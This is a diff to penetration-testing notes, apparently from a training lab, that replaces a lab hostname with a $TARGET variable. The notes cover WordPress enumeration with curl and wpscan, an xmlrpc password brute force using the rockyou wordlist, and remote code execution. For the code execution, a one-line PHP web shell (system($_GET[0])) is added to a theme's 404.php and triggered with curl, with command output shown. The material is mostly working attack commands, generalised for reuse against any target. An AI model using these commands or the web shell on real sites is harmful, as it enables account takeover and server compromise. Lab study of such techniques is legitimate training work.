@@ -15,12 +15,12 @@ wp-content/themes
 Interesting commands :
 
 ```bash
-curl -s http://blog.inlanefreight.local | grep WordPress
-curl -s http://blog.inlanefreight.local/ | grep plugins
-curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
-wpscan --url http://blog.inlanefreight.local --enumerate --api-token <API_TOKEN>
+curl -s http://$TARGET | grep WordPress
+curl -s http://$TARGET/ | grep plugins
+curl -s http://$TARGET/?p=1 | grep plugins
+wpscan --url http://$TARGET --enumerate --api-token <API_TOKEN>
 # Bruteforce
-wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://$TARGET
 ```
 
 ### Exploitation
@@ -32,7 +32,7 @@ As admin We can edit 404.php file from a theme as a reverse shell (and get RCE)
 Editing (for example) : 
 
 ```bash
-http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
+http://$TARGET/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
 ```
 
 Add :
@@ -43,7 +43,7 @@ system($_GET[0]);
 
 Trigger : 
 ```bash
-curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+curl http://$TARGET/wp-content/themes/twentynineteen/404.php?0=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
